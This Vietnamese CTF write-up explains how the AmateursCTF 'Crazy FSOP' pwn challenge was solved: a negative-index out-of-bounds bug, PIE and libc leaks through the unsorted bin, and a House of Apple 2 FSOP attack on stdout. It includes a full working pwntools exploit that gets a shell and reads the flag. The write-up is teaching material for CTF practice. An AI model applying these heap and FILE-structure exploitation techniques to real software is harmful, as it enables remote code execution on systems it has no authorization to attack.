# Write-up: Crazy FSOP (AmateursCTF)
**Thể loại:** Pwnable (Binary Exploitation)
**Kỹ thuật:** OOB Indexing, Heap Exploitation (Unsorted Bin Leak), FSOP (House of Apple 2).

## 1. Phân tích sơ bộ (Reconnaissance)

Đầu tiên, ta kiểm tra các cơ chế bảo vệ của file binary (`chal`):

```bash
checksec chal
# Arch:     amd64-64-little
# RELRO:    Full RELRO      <- Không thể ghi đè GOT table.
# Stack:    Canary found    <- Không thể Buffer Overflow trên stack.
# NX:       NX enabled      <- Không thể thực thi shellcode trên stack/heap.
# PIE:      PIE enabled     <- Địa chỉ code thay đổi mỗi lần chạy.
```
**Nhận xét:** Mọi cơ chế bảo vệ đều bật. Chúng ta cần leak địa chỉ bộ nhớ để vượt qua PIE và ASLR (Libc).

### Đọc Source Code (Code Review)

Chương trình là một trình quản lý ghi chú đơn giản với mảng toàn cục `notes`.

```c
#define MAX_NOTES (0x10)
char *notes[MAX_NOTES]; // Mảng chứa con trỏ, nằm ở vùng .bss

// ... trong vòng lặp main ...
printf("which note: ");
if (scanf("%d", &idx) != 1) goto done; // <--- LỖI Ở ĐÂY
```

**Lỗ hổng (The Bug):**
Chương trình cho phép nhập `idx` (index) là một số nguyên (`int`), nhưng **không kiểm tra xem `idx` có âm hay không**.
*   Trong C, `notes[idx]` thực chất là truy cập vào địa chỉ `&notes + (idx * 8)`.
*   Nếu `idx` âm, ta có thể truy cập vào vùng nhớ **phía trước** mảng `notes`.

Trong bộ nhớ (vùng `.bss`), các biến thường được sắp xếp gần nhau. Các con trỏ file chuẩn như `stdout`, `stdin`, `stderr` thường nằm ngay trước mảng `notes`.

**Khả năng khai thác:**
1.  **OOB Read (View):** Đọc dữ liệu ở vùng nhớ trước `notes` (giúp leak địa chỉ).
2.  **OOB Write (Create):** Ghi đè con trỏ ở vùng nhớ trước `notes` (giúp chiếm quyền điều khiển).

---

## 2. Chiến thuật khai thác (The Plan)

Để lấy shell, ta cần thực hiện 3 bước:

1.  **Leak PIE:** Tìm địa chỉ cơ sở của chương trình để biết mảng `notes` đang nằm ở đâu.
2.  **Leak Libc:** Tìm địa chỉ thư viện C để gọi hàm `system("/bin/sh")`.
3.  **FSOP Attack:** Ghi đè con trỏ `stdout` để kích hoạt shell.

---

## 3. Chi tiết kỹ thuật (Deep Dive)

### Bước 1: Leak PIE (Địa chỉ chương trình)

Khi PIE bật, địa chỉ của mảng `notes` thay đổi liên tục. Tuy nhiên, offset (khoảng cách) giữa các biến là cố định.
Bằng cách thử nghiệm (fuzzing) hoặc debug, ta phát hiện tại **Index -7**, chương trình in ra một địa chỉ nằm trong vùng code của binary.

*   `view(-7)`: Chương trình in nội dung tại `notes[-7]`.
*   Lấy giá trị đó trừ đi offset cố định (`0x4008`), ta tìm được **PIE Base**.
*   Biết PIE Base -> Ta biết chính xác địa chỉ mảng `notes`.

### Bước 2: Leak Libc (Heap Unsorted Bin)

Ta cần địa chỉ Libc để dùng hàm `system`. Vì không tìm thấy con trỏ Libc nào dễ đọc xung quanh `notes`, ta dùng kỹ thuật **Heap Reuse**.

**Lý thuyết:**
*   Khi ta `malloc` một vùng nhớ lớn (ví dụ 0x500 bytes) rồi `free` nó, vùng nhớ này không bị xóa trắng mà được đưa vào danh sách **Unsorted Bin** của Libc.
*   Để quản lý danh sách này, Libc ghi 2 con trỏ vào đầu vùng nhớ vừa free: `fd` (forward) và `bk` (backward).
*   Hai con trỏ này trỏ ngược về **Main Arena** (một vùng bên trong Libc).

**Thực hiện:**
1.  **Create(0, 0x500):** Tạo chunk A.
2.  **Create(1, 0x20):** Tạo chunk B (làm rào chắn để chunk A không bị gộp vào vùng trống lớn nhất).
3.  **Delete(0):** Free chunk A. Lúc này, 16 byte đầu của chunk A chứa địa chỉ Libc.
4.  **Create(0, 0x500, "CCCCCCCC"):** Cấp phát lại chunk A. Ta ghi đè 8 byte đầu (`fd`) bằng chữ "C", nhưng **giữ nguyên 8 byte sau** (`bk` - chính là địa chỉ Libc).
5.  **View(0):** In nội dung chunk A. Ta nhận được "CCCCCCCC" + [Địa chỉ Libc].

Từ địa chỉ này, ta trừ đi offset cố định (tính bằng `readelf` trên file `libc.so.6` đề cho) để ra **Libc Base**.

### Bước 3: Tấn công FSOP (House of Apple 2)

Đây là phần khó nhất nhưng thú vị nhất.

**FSOP là gì?**
FSOP (File Stream Oriented Programming) là kỹ thuật tấn công vào cấu trúc `FILE` (như `stdout`). Khi bạn gọi `puts` hay `printf`, chương trình sẽ dùng con trỏ `stdout` để xử lý. Nếu ta ghi đè con trỏ này thành một cấu trúc giả (Fake FILE) do ta kiểm soát, ta có thể điều hướng luồng thực thi.

**Mục tiêu:** Ghi đè `stdout` (nằm ở **Index -4**) trỏ tới Fake FILE của ta.

**Kỹ thuật House of Apple 2:**
Đây là kỹ thuật mạnh mẽ trên Glibc đời mới. Nó lợi dụng hàm `_IO_wfile_overflow`. Chuỗi gọi hàm như sau:
1.  Chương trình gọi `puts`.
2.  `puts` thấy `stdout` bị thay đổi, nó gọi hàm trong bảng ảo (vtable) giả của ta.
3.  Ta trỏ vtable về `_IO_wfile_jumps` (có sẵn trong Libc).
4.  Hàm này gọi tiếp `_IO_wdoalloc`.
5.  `_IO_wdoalloc` gọi hàm tại `vtable + 0x68` với tham số là chính con trỏ FILE.
6.  Ta set `vtable + 0x68` thành `system`.
7.  Kết quả: `system(fp)`. Vì đầu chunk FILE ta để chuỗi `"  sh;"`, nó sẽ chạy lệnh `sh`.

**Setup thông minh:**
Thay vì tạo Fake Vtable trên Heap (cần leak Heap address), ta dùng mảng `notes` trong PIE (đã biết địa chỉ).
*   Ta trỏ `_wide_data` của Fake FILE về đầu mảng `notes`.
*   Theo cấu trúc, chương trình sẽ tìm vtable tại offset `0xe0` của `_wide_data`.
*   `0xe0` tương ứng với `notes[28]` (vì 28 * 8 = 224 = 0xe0).
*   Ta dùng lệnh `create(28)` để ghi địa chỉ `fake_vtable` vào `notes[28]`.

---

## 4. Code Exploit (Giải thích từng dòng)

Dưới đây là code Python dùng thư viện `pwntools` để tự động hóa quá trình tấn công.

```python
from pwn import *

# --- CẤU HÌNH ---
exe = ELF('./chal')
libc = ELF('./libc.so.6') # Load file Libc đề bài để lấy offset chuẩn

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

# OFFSET QUAN TRỌNG: Tính bằng cách lấy địa chỉ main_arena trong libc.so.6 + 96
# Dùng lệnh: readelf -s libc.so.6 | grep main_arena
# Kết quả: 0x234ac0 + 0x60 = 0x234b20
LIBC_OFFSET = 0x234b20 

# Kết nối tới server
r = remote("amt.rs", 26797)

# --- CÁC HÀM TƯƠNG TÁC (HELPERS) ---
# Hàm tạo note (ghi đè)
def create(idx, size, data):
    if isinstance(data, str): data = data.encode()
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', str(idx).encode())  # Gửi index (có thể âm)
    r.sendlineafter(b': ', hex(size).encode()) # Gửi kích thước
    r.sendafter(b': ', data)                   # Gửi dữ liệu (dùng sendafter để không thừa \n)

# Hàm xóa note
def delete(idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

# Hàm xem note (đọc dữ liệu)
def view(idx):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

log.info("=== BẮT ĐẦU KHAI THÁC ===")

# --- BƯỚC 1: LEAK PIE ---
# Đọc index -7 để lấy địa chỉ code
view(-7)
r.recvuntil(b'data: ')
pie_leak = u64(r.recvline()[:-1][:8].ljust(8, b'\0')) # Unpack 8 byte

# Tính PIE Base từ leak (0x4008 là offset tìm được qua debug)
pie_base = pie_leak - 0x4008
if pie_base & 0xfff != 0: pie_base = pie_leak & ~0xfff # Align trang nhớ
exe.address = pie_base
log.success(f"PIE Base: {hex(pie_base)}")

# --- BƯỚC 2: LEAK LIBC (HEAP REUSE) ---
# 1. Tạo chunk lớn (0x500) để khi free sẽ vào Unsorted Bin
create(0, 0x500, b"A"*0x10)
# 2. Tạo chunk nhỏ (0x20) để chặn chunk 0 không bị gộp vào top heap
create(1, 0x20, b"B"*0x10)
# 3. Free chunk 0 -> Libc ghi địa chỉ main_arena vào đây
delete(0)
# 4. Alloc lại chunk 0. Chỉ ghi đè 8 byte đầu, giữ nguyên 8 byte sau (Libc ptr)
create(0, 0x500, b"C"*8) 

# 5. Đọc chunk 0 để lấy leak
view(0)
r.recvuntil(b'data: ')
d = r.recvline()[:-1]

if len(d) > 8:
    # Lấy 8 byte sau chuỗi "CCCCCCCC"
    heap_leak = u64(d[8:16].ljust(8, b'\0'))
    log.info(f"Raw Heap Leak: {hex(heap_leak)}")
    
    # Tính Libc Base
    libc.address = heap_leak - LIBC_OFFSET
    log.success(f"Libc Base: {hex(libc.address)}")
else:
    log.error("Leak thất bại!")

# --- BƯỚC 3: TẤN CÔNG (HOUSE OF APPLE 2) ---
system = libc.sym['system']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
notes_addr = pie_base + 0x4040 # Địa chỉ mảng notes trong PIE

# 1. Chuẩn bị Fake Vtable
# Ta dùng notes[28] làm nơi chứa pointer fake vtable
# Vtable giả này có entry tại offset 0x68 trỏ về system
fake_vtable = fit({0x68: system}, filler=b'\x00')
create(28, 0x100, fake_vtable)

# 2. Chuẩn bị Payload đè stdout (Index -4)
# Cấu trúc Fake FILE đặc biệt để trigger system("/bin/sh")
payload = fit({
    0x00: b'  sh;',          # Flags (đồng thời là lệnh shell "  sh;")
    0x28: 1,                 # _IO_write_ptr > _IO_write_base (Trigger flush)
    0x88: notes_addr,        # _lock (Trỏ vào vùng ghi được để tránh crash)
    0xa0: notes_addr,        # _wide_data (Trỏ vào mảng notes)
    0xd8: _IO_wfile_jumps,   # vtable chuẩn để bypass check ban đầu
}, filler=b'\x00').ljust(0x100, b'\0')

log.info("Ghi đè stdout...")
create(-4, 0x400, payload)

# 3. Kích hoạt shell
# Lần gọi hàm IO tiếp theo (puts/printf) sẽ kích hoạt fake vtable -> system("  sh;")
r.sendline(b'id; cat flag.txt')
r.interactive()
```

---

## 5. Tổng kết bài học

Qua bài này, một newbie có thể học được:
1.  **Mảng trong C không an toàn:** Nếu không kiểm tra chỉ số âm, ta có thể truy cập vùng nhớ quan trọng nằm trước mảng.
2.  **Heap rất hữu ích:** Không chỉ dùng để lưu dữ liệu, Heap còn chứa các con trỏ nội bộ của Libc (Unsorted Bin) giúp ta bypass ASLR.
3.  **FSOP là "Vua" của user-space pwn:** Khi bạn kiểm soát được `stdout` hoặc `stdin`, bạn gần như kiểm soát được luồng thực thi của chương trình mà không cần stack overflow.
4.  **Tầm quan trọng của Debug:** Việc tính toán offset (`-4`, `-7`, `LIBC_OFFSET`) bằng GDB và `readelf` là bước quan trọng nhất để exploit chạy đúng.